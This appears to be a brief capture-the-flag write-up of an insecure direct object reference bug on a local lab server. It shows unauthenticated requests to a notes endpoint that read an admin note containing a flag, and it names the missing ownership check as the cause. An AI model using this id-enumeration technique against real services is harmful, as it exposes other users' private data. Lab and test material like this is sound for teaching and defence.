Request: GET http://127.0.0.1:18081/notes?id=2   (NO Authorization header, no token)
Response: HTTP/1.0 200 OK
{"id": "2", "note": "admin-secret-FLAG{idor_user2}", "viewer": null}

Contrast:
GET /notes?id=1 -> {"id": "1", "note": "alice-note", "viewer": null}
GET /notes?id=0 -> {"error": "no note"}

Root cause: handler never compares authenticated uid to requested note id (no ownership check), so any/no credential reads any note. Admin note id=2 leaks FLAG{idor_user2}.
